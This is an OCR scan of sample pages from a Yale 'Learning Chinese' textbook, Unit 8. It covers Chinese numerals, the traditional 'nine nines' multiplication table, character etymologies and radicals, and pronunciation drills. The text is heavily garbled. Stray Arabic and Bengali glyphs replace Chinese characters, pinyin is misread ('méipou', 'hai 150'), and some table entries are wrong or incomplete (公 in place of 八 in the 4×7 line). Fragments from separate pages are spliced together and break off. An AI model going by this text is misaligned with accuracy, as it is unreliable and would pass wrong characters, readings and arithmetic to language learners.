wit\n\nx\n六 ৮ KR ‏ل۔‎ ط٦‎\n2+2 I 十 I 2+0 I 十 I 2+0\nlin qi ba jit shi\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n412 THE CHARACTER UNITS\n\nNOTES\n\nThe characters for ‘one’, ‘two’, and ‘three’ are obviously representational. The near left-right\nsymmetry of the characters for ‘four’, ‘six’, ‘eight’, and ‘ten’ is not entirely coincidental. 四\nseems to have represented a whole easily divided into two parts; an earlier form of ‏٭٭‎ looked\nvery much like that of 四 (with the two lower ‘legs’ of 六 matching the two inner strokes of\n四 ). A (distinguished from A rén ‘person’ and X ru ‘enter’) is also said to have represented\nthe notion of division (into two groups of four); and + represented a unity of the four cardinal\ndirections with the center. Smaller multiples of ten are occasionally represented as unit char-\nacters, especially where space is at a premium: 廿 ‘twenty’ and {ll ‘thirty’. However, they are\nstill read as if written 二 十 and 三 十 .\n\nExercise 1\n\nPractice reading the Chinese multiplication table.\n\nThe Chinese multiplication table is often called j 吴 记 chéngfibido ( 九 九\n乘 法 表 ) mine nines multiplication table’ or the jinjit koujué ( 九 九 口 诀 )\n‘nine nines rhyme’ because in its traditional form it began with the nine-\ntimes table and descended to the one. Though nowadays it is usually\nrecited upwards from one, it keeps another important feature of the tradi-\ntional system in always reciting the smaller operand first: 3 x 7, never 7 x\n3. In other words, the Chinese table has only half the entries of the\nstandard American-British table. The six through nine-times tables given\nbelow illustrate. Note that when the product is only a single digit, the\nrhythm is preserved by adding 得 d6 ‘gets’; for similar reasons, the teens\n\nدو\n\nare often recited as yishi’ér, etc., rather than just shi’ér.\n\n六 七 八 习\n\n一 六 得 六 一 七 得 七 一 八 得 八 一 九 得\n二 六 一 十 二 二 七 一 十 四 二 八 一 十 六 二 九 一 十 八\n三 六 一 十 八 三 七 二 十 一 三 八 二 十 四 三 九 二 十 七\n四 六 二 十 四 四 七 二 十 公 四 八 三 十 二 四 九 三 十 六\n五 六 三 十 五 七 三 十 五 五 八 四 十 五 九 四 十 五\n六 六 三 十 六 六 七 四 十 二 六 八 四 十 八 六 九 五 十 四\n七 七 四 十 九 七 八 五 十 六 七 九 六 十 三\n八 八 六 十 四 八 九 七 十 二\n九 九 八 十 一\n\nCopyright @ 2011 Yale University\n\nLearning Chinese Sample\n\nUNIT 8 413\n\nPractice reading telephone numbers.\n\nAlthough telephone numbers are often written out in Arabic numerals\non business cards, they do appear as characters in other contexts, with the\nexception of ling ‘zero’, which is more often written ‘O’.

It is useful to distinguish simplex (non-compound) characters from compound.

While more common characters are\noften simplex, the vast majority are compound. The form of simplex graphs can often be clas-\nsified as representational and thereby rationalized by a non-linguistic reference (e.g., 日 origi-\nnated as a representation of the sun and }] of the moon).

The right element of 他 and 她 was originally distinct from the graph 也 ,\nused to write the word yé ‘also; too’.

Both 你 and 们 / 们 have a left element that is a vertical version of the graph A\n‘person’, known as rénzipdng ‘person at the side’ (or the ‘person radical’). The right elements,\n7: and |] /P4, respectively, also appear independently (cf. next item).\n\nb. 们 / 们 consists of the person radical plus 门 / 门 mén ‘door’, which is phonetic. 门 / 门 was\noriginally a representation of a door with two leaves.\n\nc. The graph 不 , said to derive from a drawing of a bird, was borrowed to write ‏×ط‎ not because\nof its form, but because of similarity of sound. A made-up etymology: ‘% represents an arrow\nbeing shot at the ceiling—but not managing to pass through’.\n\nd The set in 88.ro is the first to include graphs that have both simplified and traditional forms:\n们 / 们 and 吗 / 合 .

SVs: 好 is composed of the female radical & and 4۴ zi ‘child’ (the latter without a phonetic\nfunction), often explained as the paradigm of a ‘good relationship’. K includes ® tidn ‘field’\nabove and the radical derived from the graph for ‘silk’ below: ‘a heavy and tiring burden for\nsuch a slender base’. 忙 combines the ‘heart radical’ (an elongated and truncated version of\n心 ) and 亡 drg as a phonetic element, and can be compared to & wang ‘to forget’ with the\nsame elements configured vertically. #/#% is composed of the element 7 / #, known as the\n‘food radical’, and the phonetic element 我 ৮6. includes two strokes (didn and ti) on the left,\nforming the so-called ‘ice radical’, found only in a few graphs such as ×۴ bing ‘ice’. The right\nelement of 4 is 4 ling, a phonetic element also found in % ling ‘zero’. The four strokes at\nthe base of 热 / 热 are a form of the ‘fire radical’ which, in its independent form, is written 火 .\n৮. ADVs: The graph 很 is composed of the radical 4 and the phonetic K gén (cf. 恨 hén, 狠\nhén, 跟 gen). 太 is K da ‘big’ with an extra didn. The graph i€/3% is also used for the word\n\nhudn ‘to give back’, which probably accounts for the presence of . on the left, a radical associ-\nated with motion. The simplified version substitutes 不 not for its sound or meaning, but for\nits general shape, which serves to represent the complicated right-hand element.\n\nc. J should be distinguished from 子 古 In the traditional set, the radical assigned to J is the\nsecond stroke, the vertical hook; but in the simplified set, it is the first stroke, whose uncon-\ntorted form is J, a radical also assigned to 也 .\n\n8.11.1 Pronunciation practice\nCover the pinyin and check your pronunciation of the following phrases.\n\nA.

The right side of the traditional graph # is said to derive from the drawing of a loom used\nto represent the root meaning of jing, the ‘warp [of a loom]’. From the movements and result\nof weaving, the word derives meanings such as ‘to pass through’ or ‘to regulate’ as well as\n‘classic texts’ [cf. English ‘text’ and ‘textile’]. The etymological meaning of the compound 己 经\nis harder to see, but probably derives from a notion of ‘to complete the task’.\n\n0. The traditional 没 has the same number of strokes as 没 in the simplified set, so they are\nplaced together above to save space.

In the simplified graph, the right side of the tra-\nditional character has been replaced by the independently occurring element 父 . 没 / 没 is also\nused for the word mo ‘to submerge’, which probably explains the presence of the water radical.\n\nCopyright © 2011 Yale University\n423\n\n你 吱\n\nni ne\n\n饭 很 好\nfan hén hao\n\nARR\nhén [ei\nhai méi\n\nyijing zou le\n33\n\nxiaké le\n\nLearning Chinese Sample\n\nméiyou\n下 玲\nxiaban\nWA\nmingtian\n走 了 没 有\n\nzou le méipou\n\n吃 饭\nchifan\n不 饲 了\n\nbi é le\n\nhai méi\n\n走 了\n\nzou le\n没 课\n\nméi ké\n\n已 经 吃 了\nyijing chi le\n\n运 好\nhai 150\n\n你 们\n\nnimen\n\nUNIT 8\n\n8.12.1 Phrases\n\nA.
